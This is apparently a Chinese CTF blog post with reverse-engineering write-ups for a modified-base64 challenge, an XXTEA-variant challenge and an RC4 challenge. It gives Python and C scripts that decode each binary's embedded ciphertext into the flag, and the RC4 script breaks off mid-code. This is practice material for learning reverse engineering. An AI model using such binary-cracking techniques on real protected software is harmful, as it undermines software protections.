        <content type="html"><![CDATA[<h1 id="re">RE</h1><h2 id="拔丝溜四-newstarsctf2022">拔丝溜四（NewstarsCTF2022）</h2><p>~~题在这里:~~https://buuoj.cn/match/matches/146/challenges#%E6%8B%94%E4%B8%9D%E6%BA%9C%E8%82%86%20(easy)</p><p>这个题,对base64进行了魔改…</p><p>首先,分析题目,从start入口寻找main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194752784.png" alt="image-20230806194752784"></p><p>从这里的Code=某个函数()继续进入(既然是给返回代码赋值,那么很有可能就是main入口)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194844163.png" alt="image-20230806194844163"></p><p>这里的j_main是我命名成main的,后来IDA又重新分析为j_main(),进入真正的main后就可以正式分析了,</p><p>实际上代码就是对输入的长度为42的flag进行魔改的base64编码,编码结果就是main中那个显而易见的str2:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195020106.png" alt="image-20230806195020106"></p><p>第29行的encode()也是自己修改的函数名,魔改的base64()编码就是这里进行</p><p>进入后发现不是普通的base64,encode()将flag分成若干组,3个一组分别进行编码,但是每一组都使用不同的编码字符表—也就是所谓的变表加密</p><p>再次进入循环中的第一句函数调用中,发现有一个rand(),实际从逻辑上考虑肯定不可能是随机的,否则不会出现那个固定的base64结果,所以联想到对srand()调用时输入了某个固定的种子,但是我这里没有看出来哪个是srand()函数的调用(我太菜了)</p><p>于是我使用动态调试的方法,一个个的把求字符表的偏移值v1求出来:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195428984.png" alt="image-20230806195428984" style="zoom:50%;" /><p>在这里设断点后,直到运行完,把所有的v1出现过的值写成python列表就可以写解密脚本了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;CPaKBfUZFcNwW9qCKgyvuS2PGPQ9mttGc/wCNS0w6hDwGOSsOkOEkL5V&#x27;</span></span><br><span class="line">alpha = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">key = [<span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x39</span>, <span class="number">0xa</span>, <span class="number">0x3e</span>, <span class="number">0x1e</span>, <span class="number">0x3b</span>, <span class="number">0x19</span>, <span class="number">0x0c</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x3a</span>, <span class="number">0x1</span>, <span class="number">0x18</span>]</span><br><span class="line"><span class="comment">#key即v1的所有变化值</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>):</span><br><span class="line">    new_alpha = <span class="string">&#x27;&#x27;</span> + alpha[key[step]:] + alpha[<span class="number">0</span>:key[step]]<span class="comment">#将原字符表进行两部分的切片,调换位置,如不懂需要再去看看源码逻辑</span></span><br><span class="line">    <span class="comment"># print(new_alpha)</span></span><br><span class="line">    step += <span class="number">1</span></span><br><span class="line">    result = base64.b64decode(data[i:i + <span class="number">4</span>].translate(<span class="built_in">str</span>.maketrans(new_alpha, alpha)))</span><br><span class="line">    <span class="comment">#这里使用maketrans进行字符表的映射转换</span></span><br><span class="line">    <span class="built_in">print</span>(result.decode(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195649900.png" alt="image-20230806195649900"></p><p>但是比赛结束了没办法提交flag…</p><p>结束…</p><h2 id="eztea-newstarsctf2022">EzTea(NewstarsCTF2022)</h2><p>这个题顾名思义,Tea加密…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114651660.png" alt="image-20230807114651660" style="zoom:50%;" /><p>去分析代码就能知道,要对输入的串(之所以不说字符串是因为加密解密还是说字节串比较好)进行加密,然后与一个9*sizeof(int32_t)==36字节长度的加密后的串进行比较,也就是说这个加密的串就是加密后的flag.</p><p>那么我们要分析程序的加密算法,容易得知这是TEA系列的加密算法,而且通过加密中的&lt;&lt;4和&gt;&gt;4可以知道是TEA目前优化最好的(貌似?)XXTEA加密(不过MX还是要自己改的)</p><p>写出逆向解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这是网上的XXTEA使用的MX,但是与题不符</span></span><br><span class="line"><span class="comment"> * #define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IDA反汇编的加密部分,根据此进行MX的修改</span></span><br><span class="line"><span class="comment"> * v9 = ((v5 ^ *(_DWORD * )(a3 + 4i64 * (v10 ^ i &amp; 3))) + (v6 ^ v7)) ^ (((32 * v5) ^ (v6 &gt;&gt; 3))</span></span><br><span class="line"><span class="comment"> * + ((4 * v6) ^ (v5 &gt;&gt; 4)))</span></span><br><span class="line"><span class="comment"> * + intlist[i];</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这是根据IDA正确编写的解密算法</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z ^ k[(e^p)&amp;3])+(y^sum))^ (((32*z)^y&gt;&gt;3)+((4*y)^(z&gt;&gt;4))))</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x11451400</span>;</span><br><span class="line">    <span class="type">unsigned</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = q * DELTA;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x8</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> data[] = &#123;</span><br><span class="line">            <span class="number">0x82</span>, <span class="number">0x8a</span>, <span class="number">0xfa</span>, <span class="number">0x38</span>, <span class="number">0x80</span>,</span><br><span class="line">            <span class="number">0x13</span>, <span class="number">0x50</span>, <span class="number">0xd7</span>, <span class="number">0x9d</span>, <span class="number">0x96</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0xe</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0x16</span>,</span><br><span class="line">            <span class="number">0x4e</span>, <span class="number">0xab</span>, <span class="number">0x29</span>, <span class="number">0x3a</span>, <span class="number">0x71</span>,</span><br><span class="line">            <span class="number">0x3d</span>, <span class="number">0x39</span>, <span class="number">0xe5</span>, <span class="number">0x6c</span>, <span class="number">0x2e</span>,</span><br><span class="line">            <span class="number">0x75</span>, <span class="number">0x9d</span>, <span class="number">0xb6</span>, <span class="number">0xe6</span>, <span class="number">0x88</span>,</span><br><span class="line">            <span class="number">0x1a</span>, <span class="number">0x84</span>, <span class="number">0x59</span>, <span class="number">0xb4</span>, <span class="number">0x31</span>, <span class="number">0x6f</span></span><br><span class="line">    &#125;;</span><br><span class="line">    btea((<span class="type">uint32_t</span> *) data, <span class="number">-9</span>, k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114835421.png" alt="image-20230807114835421" style="zoom:33%;" /><p>结束…</p><h2 id="babyalgorithm">BabyAlgorithm</h2><p>这个题没啥好说的,就是RC4,然后我非要自己写脚本…费老半天</p><p>按照顺序把S-box(key)之类的求出来就行</p><p>我的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> key2[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">170</span>, <span class="number">109</span>, <span class="number">41</span>, <span class="number">217</span>, <span class="number">180</span>, <span class="number">246</span>, <span class="number">227</span>, <span class="number">208</span>, <span class="number">96</span>, <span class="number">11</span>, <span class="number">160</span>, <span class="number">81</span>, <span class="number">205</span>, <span class="number">134</span>, <span class="number">234</span>, <span class="number">212</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">250</span>, <span class="number">79</span>, <span class="number">127</span>, <span class="number">177</span>, <span class="number">105</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">22</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">253</span>, <span class="number">47</span>, <span class="number">125</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">60</span>, <span class="number">117</span>, <span class="number">107</span>, <span class="number">44</span>, <span class="number">162</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">93</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>, <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">100</span>, <span class="number">74</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">140</span>, <span class="number">39</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">64</span>, <span class="number">38</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>, <span class="number">91</span>,</span><br><span class="line">        <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>, <span class="number">215</span>,</span><br><span class="line">        <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>, <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>, <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">128</span>, <span class="number">25</span>, <span class="number">86</span>, <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">126</span>, <span class="number">53</span>, <span class="number">90</span>, <span class="number">24</span>, <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">247</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">156</span>,</span><br><span class="line">        <span class="number">158</span>, <span class="number">154</span>, <span class="number">118</span>, <span class="number">31</span>, <span class="number">196</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">230</span>, <span class="number">28</span>, <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">199</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">206</span>, <span class="number">67</span>, <span class="number">228</span>, <span class="number">26</span>, <span class="number">237</span>, <span class="number">9</span>, <span class="number">51</span>, <span class="number">29</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>, <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">136</span>, <span class="number">17</span>, <span class="number">176</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">85</span>, <span class="number">45</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">59</span>, <span class="number">52</span>, <span class="number">254</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//v5,v6和key都需要提前跑一遍获取最后的状态,所以这个代码非常麻烦</span></span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">45</span>;</span><br><span class="line">    <span 